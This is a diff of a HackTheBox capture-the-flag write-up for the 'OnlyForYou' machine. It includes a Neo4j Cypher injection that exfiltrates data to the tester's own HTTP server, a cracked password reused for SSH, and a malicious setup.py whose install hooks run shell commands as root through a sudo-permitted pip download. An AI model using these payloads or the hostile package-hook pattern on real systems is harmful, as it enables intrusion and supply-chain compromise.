@@ -1,5 +1,6 @@
 # HTB - OnlyForYou
-## Start: 29/05/23
+## Start: 29/04/23
+## Finish: 08/05/23
 ## IP: 10.10.11.210
 ---
 ## Info Gathering
@@ -314,7 +315,7 @@ Interesting:
 I'm new when it comes to cypher injection, i can think about it in terms of sql injection in this specific instance but i know there are more interesting things involved here..
 The injectable page is on the employee search page.
 
-![Neo4j injection]()
+![Neo4j injection](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/neo4jinjection1.png)
 
 ```
 ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.65:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
@@ -355,7 +356,16 @@ We can already see the employee labelled in the actual app, so i will try and lo
 ```
 
 Well these look like hashes, may as well put them through hashcat or john if that doesn't work..
-Well that was easy enough, not very good passwords, but where are they used? not in cogs. not in neo4j... well maybe john:ThisIs4You will work on ssh?..
+
+![Passwords](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/extractedpw1.png)
+
+Well that was easy enough, not very good passwords, but where are they used? 
+
+
+
+Well john:ThisIs4You works in:
+- Cogs
+- SSH
 
 ```
 ssh john@10.10.11.210         
@@ -366,4 +376,67 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)
 
 wow that was a little tricky, but i guess this is what custom password lists are for.
 
+## privilege escalation
+Compared to finding user access, root access here seems very very simple, `sudo -l` shows we are able to run `pip download` as root without password as long as it comes from the cogs site. 
+```
+john@only4you:~$ sudo -l
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User john may run the following commands on only4you:
+    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+```
+
+Well we have access to cogs now with the password cracked from before, and it just so happens that pip download can be exploited to run code under the running user, in this case root.
+This is a pretty good writeup of this concept: https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/
+
+
+setup.py
+```
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import os
+
+def a():
+    os.system('cp /root/root.txt /tmp/1 ; chmod 777 /tmp/1')
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        a()
+        egg_info.run(self)
+
+class RunInstallCommand(install):
+    def run(self):
+        a()
+        install.run(self)
+
+setup(
+    name = "open",
+    version = "1",
+    license = "MIT",
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand
+    },
+)
+
+```
+
+build this with
+`pythom -m build`. Upload the .tar.gz from the dist to the cogs repo...
+
+![Upload to cogs]()
+
+
+`sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/tedt5/raw/master/open-1.tar.gz`
+http://localhost:3000/john/tedt5/raw/master/open-1.tar.gz
+
+and 
+```
+john@only4you:/tmp$ cat 1
+2f4a************************971
+```
+
+All done, the priv esc was something i've seen a fair few times, i'm decently familiar with searching for access with `sudo -l`, but finding that initial access was difficult, going into one service account to access another service account via `chisel` is something i should look at more as there are typically a lot more interesting services running internally on most machines, and more surface means more to attack...
